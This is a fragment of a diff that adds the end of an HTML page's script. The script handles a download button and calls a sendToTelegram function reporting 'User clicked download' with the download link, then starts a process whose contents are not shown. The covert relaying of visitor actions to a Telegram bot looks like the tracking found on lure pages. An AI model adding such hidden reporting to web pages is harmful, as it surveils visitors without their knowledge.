+                    sendToTelegram(`📥 User clicked download: ${DOWNLOAD_LINK}`);
+                    
+                    setTimeout(() => {
+                        errorMsg.textContent = "";
+                        errorMsg.style.color = "#ff0000";
+                    }, 3000);
+                } catch(e) {
+                    errorMsg.textContent = "❌ Error starting download!";
+                }
+            });
+        }
+        
+        startProcess();
+    </script>
+</body>
+</html>
